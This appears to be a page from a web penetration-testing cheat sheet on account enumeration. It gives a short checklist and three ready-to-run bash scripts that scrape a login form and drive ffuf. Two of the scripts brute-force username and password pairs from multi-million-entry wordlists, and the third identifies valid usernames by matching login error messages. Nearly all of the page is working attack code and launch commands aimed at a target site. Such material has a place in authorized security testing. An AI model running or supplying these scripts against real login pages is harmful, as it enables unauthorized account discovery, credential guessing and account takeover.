# Account Enumeration



## Check List

* [ ] _Review processes that pertain to user identification (e.g. registration, login, etc.)._
* [ ] _Enumerate users where possible through response analysis._

## Cheat Sheet

### Status Code

#### [FFUF](https://github.com/ffuf/ffuf)

_Create Script_

```bash
sudo nano sc-user-enum.sh
```

```bash
#!/bin/bash

# Check if URL is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <domain.com/login> <userlist.txt> <passlist.txt>"
    exit 1
fi

URL="$1"
USERLIST="$2"
PASSLIST="$3"

# Fetch login page HTML
HTML=$(curl -s "$URL")

# Extract the first form block (up to </form>)
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 50)

# Extract form action attribute (default to "/")
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
if [ -z "$ACTION" ]; then
    ACTION="/"
fi

# Extract form method (default to GET)
METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
if [ -z "$METHOD" ]; then
    METHOD="get"
fi

# Construct full action URL
if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    # Relative path without starting slash
    BASE_URL=$(echo "$URL" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract username and password input field names
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user|username|login|email' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass|password|pwd' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

# Set defaults if extraction failed
if [ -z "$USERNAME_FIELD" ]; then USERNAME_FIELD="username"; fi
if [ -z "$PASSWORD_FIELD" ]; then PASSWORD_FIELD="password"; fi

# Extract cookies if present - Complete cookie extraction
COOKIES=$(curl -s -I "$URL" | grep -i "set-cookie:" | sed 's/set-cookie: //gi' | sed 's/\r$//' | tr '\n' '; ' | sed 's/; $//')

# Prepare payload data for fuzzing
DATA="${USERNAME_FIELD}=FUZZ&${PASSWORD_FIELD}=FUZZ2"

# Build headers string - Fixed approach
HEADERS=""
HEADERS="$HEADERS -H 'Content-Type: application/x-www-form-urlencoded'"
HEADERS="$HEADERS -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0'"
HEADERS="$HEADERS -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'"
HEADERS="$HEADERS -H 'Accept-Language: en-US,en;q=0.5'"
HEADERS="$HEADERS -H 'Accept-Encoding: gzip, deflate'"
HEADERS="$HEADERS -H 'Connection: keep-alive'"
HEADERS="$HEADERS -H 'Upgrade-Insecure-Requests: 1'"
HEADERS="$HEADERS -H 'Referer: $URL'"

# Add cookies header only if cookies were found - Fixed cookie handling
if [ -n "$COOKIES" ]; then
    HEADERS="$HEADERS -H 'Cookie: $COOKIES'"
fi

if [[ "$METHOD" == "get" ]]; then
    # For GET: append parameters to URL
    FFUF_URL="${FULL_ACTION}?${DATA}"    
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ" \
         -w "$PASSLIST:FUZZ2" \
         -X GET \
         -ac -c -r \
         -mc 200 \
         "$HEADERS"
else
    # For POST and others: send data with -d    
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ" \
         -w "$PASSLIST:FUZZ2" \
         -X POST \
         -d "$DATA" \
         -ac -c -r \
         -mc 200 \
         "$HEADERS"
fi
```

_Run Script_

```bash
sudo chmod +x sc-user-enum.sh;sudo ./sc-user-enum.sh $WEBSITE/login \
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```

### Error Message

#### [FFUF](https://github.com/ffuf/ffuf)

_Create Script_

```bash
sudo nano em-user-enum.sh
```

```bash
#!/bin/bash

# Check if URL is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <domain.com/login> <userlist.txt> <passlist.txt>"
    exit 1
fi

URL="$1"
USERLIST="$2"
PASSLIST="$3"

# Fetch login page HTML
HTML=$(curl -s "$URL")

# Extract the first form block (up to </form>)
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 50)

# Extract form action attribute (default to "/")
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
if [ -z "$ACTION" ]; then
    ACTION="/"
fi

# Extract form method (default to GET)
METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
if [ -z "$METHOD" ]; then
    METHOD="get"
fi

# Construct full action URL
if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    # Relative path without starting slash
    BASE_URL=$(echo "$URL" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract username and password input field names
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user|username|login|email' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass|password|pwd' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

# Set defaults if extraction failed
if [ -z "$USERNAME_FIELD" ]; then USERNAME_FIELD="username"; fi
if [ -z "$PASSWORD_FIELD" ]; then PASSWORD_FIELD="password"; fi

# Extract cookies if present - Complete cookie extraction
COOKIES=$(curl -s -I "$URL" | grep -i "set-cookie:" | sed 's/set-cookie: //gi' | sed 's/\r$//' | tr '\n' '; ' | sed 's/; $//')

# Prepare payload data for fuzzing
DATA="${USERNAME_FIELD}=FUZZ&${PASSWORD_FIELD}=FUZZ2"

# Build headers string - Fixed approach
HEADERS=""
HEADERS="$HEADERS -H 'Content-Type: application/x-www-form-urlencoded'"
HEADERS="$HEADERS -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0'"
HEADERS="$HEADERS -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'"
HEADERS="$HEADERS -H 'Accept-Language: en-US,en;q=0.5'"
HEADERS="$HEADERS -H 'Accept-Encoding: gzip, deflate'"
HEADERS="$HEADERS -H 'Connection: keep-alive'"
HEADERS="$HEADERS -H 'Upgrade-Insecure-Requests: 1'"
HEADERS="$HEADERS -H 'Referer: $URL'"

# Add cookies header only if cookies were found - Fixed cookie handling
if [ -n "$COOKIES" ]; then
    HEADERS="$HEADERS -H 'Cookie: $COOKIES'"
fi

if [[ "$METHOD" == "get" ]]; then
    # For GET: append parameters to URL
    FFUF_URL="${FULL_ACTION}?${DATA}"    
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ" \
         -w "$PASSLIST:FUZZ2" \
         -X GET \
         -ac -c -r \
         -mc 200 \
         -fr "invalid username|invalid password|login failed|authentication failed|unauthorized|access denied| نام کاربری یا رمز عبور معتبر نیست" \
         "$HEADERS"
else
    # For POST and others: send data with -d    
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ" \
         -w "$PASSLIST:FUZZ2" \
         -X POST \
         -d "$DATA" \
         -ac -c -r \
         -mc 200 \
         -fr "invalid username|invalid password|login failed|authentication failed|unauthorized|access denied| نام کاربری یا رمز عبور معتبر نیست" \
         "$HEADERS"
fi
```

_Run Script_

```bash
sudo chmod +x em-user-enum.sh;sudo ./em-user-enum.sh $WEBSITE/login \
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```

### **Nonexistent Username**

#### [FFUF](https://github.com/ffuf/ffuf)

_Create Script_

```bash
sudo nano nu-user-enum.sh
```

```bash
#!/bin/bash

# Check if URL is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <domain.com/login> <userlist.txt>"
    exit 1
fi

URL="$1"
USERLIST="$2"

# Fetch login page HTML
HTML=$(curl -s "$URL")

# Extract the first form block (up to </form>)
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 50)

# Extract form action attribute (default to "/")
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
if [ -z "$ACTION" ]; then
    ACTION="/"
fi

# Extract form method (default to GET)
METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
if [ -z "$METHOD" ]; then
    METHOD="get"
fi

# Construct full action URL
if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    # Relative path without starting slash
    BASE_URL=$(echo "$URL" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract username and password input field names
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user|username|login|email' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass|password|pwd' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

# Set defaults if extraction failed
if [ -z "$USERNAME_FIELD" ]; then USERNAME_FIELD="username"; fi
if [ -z "$PASSWORD_FIELD" ]; then PASSWORD_FIELD="password"; fi

# Extract cookies if present - Complete cookie extraction
COOKIES=$(curl -s -I "$URL" | grep -i "set-cookie:" | sed 's/set-cookie: //gi' | sed 's/\r$//' | tr '\n' '; ' | sed 's/; $//')

# Prepare payload data for fuzzing
DATA="${USERNAME_FIELD}=FUZZ&${PASSWORD_FIELD}=Fakepassword1234"

# Build headers string - Fixed approach
HEADERS=""
HEADERS="$HEADERS -H 'Content-Type: application/x-www-form-urlencoded'"
HEADERS="$HEADERS -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0'"
HEADERS="$HEADERS -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'"
HEADERS="$HEADERS -H 'Accept-Language: en-US,en;q=0.5'"
HEADERS="$HEADERS -H 'Accept-Encoding: gzip, deflate'"
HEADERS="$HEADERS -H 'Connection: keep-alive'"
HEADERS="$HEADERS -H 'Upgrade-Insecure-Requests: 1'"
HEADERS="$HEADERS -H 'Referer: $URL'"

# Add cookies header only if cookies were found - Fixed cookie handling
if [ -n "$COOKIES" ]; then
    HEADERS="$HEADERS -H 'Cookie: $COOKIES'"
fi

if [[ "$METHOD" == "get" ]]; then
    # For GET: append parameters to URL
    FFUF_URL="${FULL_ACTION}?${DATA}"    
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ" \
         -X GET \
         -ac -c -r \
         -mc 200 \
         -mr "invalid username|user not found|unknown user|no such user|نام کاربری اشتباه|کاربر یافت نشد" \
         "$HEADERS"
else
    # For POST and others: send data with -d    
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ" \
         -X POST \
         -d "$DATA" \
         -ac -c -r \
         -mc 200 \
         -mr "invalid username|user not found|unknown user|no such user|نام کاربری اشتباه|کاربر یافت نشد" \
         "$HEADERS"
fi
```

_Run Script_

```bash
sudo chmod +x nu-user-enum.sh;sudo ./nu-user-enum.sh $WEBSITE/login \
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
